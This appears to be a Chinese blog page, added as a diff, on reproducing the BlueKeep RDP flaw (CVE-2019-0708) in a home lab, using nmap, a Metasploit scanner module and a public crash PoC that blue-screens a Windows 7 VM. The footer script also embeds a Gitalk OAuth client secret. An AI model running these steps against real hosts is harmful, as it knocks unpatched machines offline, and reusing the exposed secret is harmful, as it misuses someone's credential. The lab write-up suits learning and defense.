@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"content.json"};
+  </script>
+
+  <meta name="description" content="终于来到了这一步，你你你，就是我第一个复现的漏洞啦！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2019-0708漏洞复现及防御机制">
+<meta property="og:url" content="http://example.com/posts/2d03ac3f.html">
+<meta property="og:site_name" content="v5le0n9&#39;s garden">
+<meta property="og:description" content="终于来到了这一步，你你你，就是我第一个复现的漏洞啦！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.1.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.2.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.3.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.4.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.5.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.6.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.7.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.8.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.9.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.10.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.12.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.11.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.13.png">
+<meta property="article:published_time" content="2022-05-24T07:28:42.637Z">
+<meta property="article:modified_time" content="2022-05-24T15:14:09.189Z">
+<meta property="article:author" content="v5le0n9">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/posts/undefined/2.2.1.png">
+
+<link rel="canonical" href="http://example.com/posts/2d03ac3f.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CVE-2019-0708漏洞复现及防御机制 | v5le0n9's garden</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">v5le0n9's garden</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小凉的秘密基地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/v5le0n9" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/2d03ac3f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2019-0708漏洞复现及防御机制
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-24 15:28:42 / 修改时间：23:14:09" itemprop="dateCreated datePublished" datetime="2022-05-24T15:28:42+08:00">2022-05-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>终于来到了这一步，你你你，就是我第一个复现的漏洞啦！</p>
+<span id="more"></span>
+<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的Windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年的 WannaCry 恶意软件的传播方式类似，成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p>
+<h2 id="1-2-影响范围"><a href="#1-2-影响范围" class="headerlink" title="1.2 影响范围"></a>1.2 影响范围</h2><p>该漏洞影响旧版本的Windows系统，包括：Windows 7 、 Windows Server 2008 R2 、 Windows Server 2008 、Windows 2003 、 Windows XP。</p>
+<p>Windows 8 和 Windows 10及之后版本不受此漏洞影响。</p>
+<h2 id="1-3-影响方式"><a href="#1-3-影响方式" class="headerlink" title="1.3 影响方式"></a>1.3 影响方式</h2><p>CVE-2019-0708漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。如果被攻击者利用，会导致服务器被入侵，中病毒，像 WannaCry 永恒之蓝漏洞一样大规模的感染。若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。</p>
+<h2 id="1-4-漏洞评级"><a href="#1-4-漏洞评级" class="headerlink" title="1.4 漏洞评级"></a>1.4 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-0708: 高危</span><br></pre></td></tr></table></figure>
+<h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-RDP协议"><a href="#2-1-RDP协议" class="headerlink" title="2.1 RDP协议"></a>2.1 RDP协议</h2><p>远程显示协议(Remote Display Protocol，RDP)，提供了客户和服务器之间的连接。</p>
+<p>RDP是微软终端服务应用的协议，服务端基于Win 2000 / Win NT。协议基于T.128（T.120协议族）提供多通道通信。在客户端支持多种资源缓冲和图片数据的压缩处理，运用RDP协议的虚拟化平台有VMware、Microsoft等。</p>
+<p>终端服务使任何一台有权限的终端机，用已知的账号登录服务器，可以使用账号内的资源，包括软件，硬件资源；同时，在协议升级后，客户端连接后可以使用本地的资源，包括本地打印机、声音本地回放，本地磁盘资源和本地硬件接口。所有的计算都在服务器端进行，客户端只需要处理网络连接、接收数据、界面显示和设备数据输出。</p>
+<h2 id="2-2-专业术语"><a href="#2-2-专业术语" class="headerlink" title="2.2 专业术语"></a>2.2 专业术语</h2><ul>
+<li>POC(Proof of Concept)：观点证明，用来证明漏洞存在的。简单来说是用来证明一段漏洞的代码，它是无害的。</li>
+<li>EXP(Exploit)：漏洞利用，是指利用系统漏洞进行攻击的动作。</li>
+<li>Payload：有效载荷，指的是Exploit执行成功之后，在系统中进行恶意操作的代码或者指令。</li>
+<li>Shellcode：简单翻译就是shell代码，是payload的一种，因为建立正反shell而得名。Shellcode是一段利用软件漏洞执行的代码，Shellcode为16进制的机器码， 可在寄存器eip溢出后，塞入一段让CPU执行的Shellcode机器码，让电脑可以执行攻击者的任意指令。</li>
+</ul>
+<h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p>
+<p>靶机：Windows 7  x86 旗舰版（IP地址：192.168.193.140）</p>
+<p>利用工具：MSF</p>
+<p>POC：<a target="_blank" rel="noopener" href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p>
+<h2 id="2-2-漏洞复现"><a href="#2-2-漏洞复现" class="headerlink" title="2.2 漏洞复现"></a>2.2 漏洞复现</h2><p>1.在靶机中设置远程桌面连接：</p>
+<img src="/posts/undefined/2.2.1.png" class="" title="设置远程桌面连接">
+<p>2.开启公用文件夹共享：</p>
+<img src="/posts/undefined/2.2.2.png" class="" title="开启公用文件夹共享">
+<p>3.在Windows 防火墙开启3389端口：</p>
+<img src="/posts/undefined/2.2.3.png" class="" title="开启3389端口">
+<p>4.在攻击机中更新应用，安装MSF：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
+<p>有关MSF的知识可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/111540117">MSF详解</a>，Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p>
+<p>5.验证靶机是否开启了3389端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.193.140</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.4.png" class="" title="扫描靶机是否开启3389端口">
+<p>6.在确认开启了3389端口后执行MSF进行漏洞扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.5.png" class="" title="进入MSF">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.6.png" class="" title="重新加载所有模块">
+<p>7.寻找可利用的工具，可以找到如下工具进行探测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 0708</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.7.png" class="" title="启用模块">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p>启用0708RDP攻击模块，查看相关信息和设置。</p>
+<p>8.设置参数并进行检测：</p>
+<p>设置rhost为靶机IP，可以发现存在可利用漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.193.140</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞">
+<p>9.安装pip3和impacket库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.9.png" class="" title="安装pip3和impacket库">
+<p>10.下载POC，修改脚本权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br></pre></td></tr></table></figure>
+<p>进去该目录看看里面有什么文件以及它们的权限。发现它们没有执行权限。</p>
+<img src="/posts/undefined/2.2.10.png" class="" title="POC包含的文件">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 crashpoc.py</span><br></pre></td></tr></table></figure>
+<p>chmod表示change mod，修改文件属性；<code>crashpoc.py</code>表示所要修改的文件；777表示权限列表，每个“7”表示一组，共三组。“r—”二进制表示“100”，其值为4；而“rwx”表示“111”，其值为7，即所有权限都开启。</p>
+<img src="/posts/undefined/2.2.12.png" class="" title="修改文件权限">
+<p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么第9步要进行安装impacket库。</p>
+<img src="/posts/undefined/2.2.11.png" class="" title="POC包含的文件">
+<p>11.利用脚本进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 crashpoc.py 192.168.193.140 32</span><br><span class="line">#IP地址 目标IP地址主机的系统版本</span><br></pre></td></tr></table></figure>
+<p>靶机蓝屏，攻击成功。</p>
+<img src="/posts/undefined/2.2.13.png" class="" title="靶机蓝屏">
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="v5le0n9 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="v5le0n9 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/5ec21076.html" rel="prev" title="勒索病毒中的加解密原理">
+      <i class="fa fa-chevron-left"></i> 勒索病毒中的加解密原理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">1. 漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">1.1 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">1.2 影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%B1%E5%93%8D%E6%96%B9%E5%BC%8F"><span class="nav-text">1.3 影响方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7"><span class="nav-text">1.4 漏洞评级</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">2. 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-RDP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.1 RDP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD"><span class="nav-text">2.2 专业术语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">2. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">2.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">2.2 漏洞复现</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="v5le0n9"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">v5le0n9</p>
+  <div class="site-description" itemprop="description">v5le0n9's garden</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/Leong_Vinson" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leong_Vinson" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/v5le0n9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;v5le0n9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:v5le0n9@163.com" title="E-Mail → mailto:v5le0n9@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v5le0n9</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">915k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13:52</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '7c58e80079a2457b610d',
+      clientSecret: 'fc16b1b0fdfb278016ebe41c20f3743c3c927466',
+      repo        : 'comments.github.io',
+      owner       : 'v5le0n9',
